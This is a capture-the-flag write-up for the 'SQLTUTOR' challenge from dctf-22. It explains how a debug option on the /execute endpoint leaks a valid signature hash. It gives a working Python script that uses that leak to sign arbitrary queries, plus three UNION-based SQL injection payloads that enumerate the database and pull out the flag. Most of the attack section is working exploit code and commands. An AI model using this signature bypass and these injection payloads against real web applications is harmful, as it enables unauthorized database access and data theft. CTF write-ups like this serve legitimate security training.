# SQLTUTOR | dctf-22

This challenge let us execute `sql query` on database, in this creative way

1. we type username , that username fill into whole sql query on backend side.
2. first that sqlquery submitted to `/verify_and_sign_text` 
3. this endpoing sign this with some salt we donot know and return `sha1` hash.
4. that `hash` and `text`, submitted to `/execute`.
5. we can perform `debug` on this `/execute` endpoint , to leak `hash`, of malicious query having sqlinjection payload.
6. so this is exploit is use.

```py
#!/usr/bin/env python3
#from requests import *
from httpx import *
from base64 import *
import sys
url = "https://sqltutor.dragonsec.si/"
#proxies = {
#  "http://":"http://127.0.0.1:8080",
#  "https://":"http://127.0.0.1:8080"
#}
#client = Client(proxies = proxies)
client = Client()
def generate_hash(payload):
  return client.post(url+"execute", data={"text":b64encode(payload.encode() ).decode(), "signature":"1","queryNo":"0","debug":"1"}).json()['debug']['compare'].split(" ")[0]

def send_payload(payload,_hash):
  return client.post(url+"execute", data={"text":b64encode(payload.encode() ).decode(), "signature":_hash,"queryNo":"0","debug":"1"}).json()

if __name__ == "__main__":
  payload = str(sys.argv[1])
  data = send_payload(payload,generate_hash(payload))
  print(data)

```

i use these series of queries to obtain flag:

`./exploit.py "admin' UNION ALL SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()#"`

`./exploit.py "admin' UNION ALL SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flags'#"`

`./exploit.py "admin' UNION ALL SELECT id,flag,0,0 from flags#"`

# FLAG  
![https://i.imgur.com/O4qcT9Z.png](https://i.imgur.com/O4qcT9Z.png)